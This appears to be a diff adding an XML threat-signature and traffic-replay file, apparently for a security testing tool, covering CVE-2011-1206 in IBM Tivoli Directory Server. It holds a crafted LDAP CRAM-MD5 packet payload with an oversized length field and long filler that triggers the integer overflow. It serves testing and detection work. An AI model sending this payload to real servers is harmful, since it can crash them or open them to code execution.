@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM Tivoli Directory Server ibmslapd.exe Integer Overflow"/>
+    <EngDesc display="true" value="An integer overflow vulnerability exists in IBM Tivoli Directory Server (TDS). The vulnerability is due to lack of input validation on LDAP CRAM-MD5 packets sent to the affected service. A crafted packet can trigger a buffer overrun that can be leveraged to inject and execute arbitrary code by the attackers.            A remote unauthenticated attacker could exploit this vulnerability by sending a specially crafted LDAP packet to the affected server. Successful exploitation allows the attacker to execute arbitrary code on the server with the privileges of the SYSTEM user.&#13;&#10;"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="LDAP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Tivoli_Directory_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="5.x/6.x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20110404-04"/>
+    <CVEID display="true" value="CVE-2011-1206"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim"/>
+    <ID display="true" value="58617c425b855962d24bb07eda3335c1"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634417653418302701"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1306315802" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="LDAPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="C"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:06:0B:1B" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="045E" Identification="8D0B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="4798" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="58522" destPort="$LDAPdestPort" SeqNumber="E25E5C7F" AckNumber="1C21ED58" HeaderLength="08" WindowSize="002E" Checksum="DBEA" UrgentPointer="0000" Options="0101080A2FB0D17B00000000" Payload="30840000042402010160840000041B0201030400A3840000041004084352414D2D4D44350484FFFFFFFF41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:06:0B:1B" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="004A" Identification="18D6" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="7FE1" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$LDAPdestPort" destPort="58522" SeqNumber="1C21ED58" AckNumber="E25E60A9" HeaderLength="08" WindowSize="F6C6" Checksum="6233" UrgentPointer="0000" Options="0101080A00EE179A2FB0D17B" Payload="3084000000100201016184000000070A010204000400" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
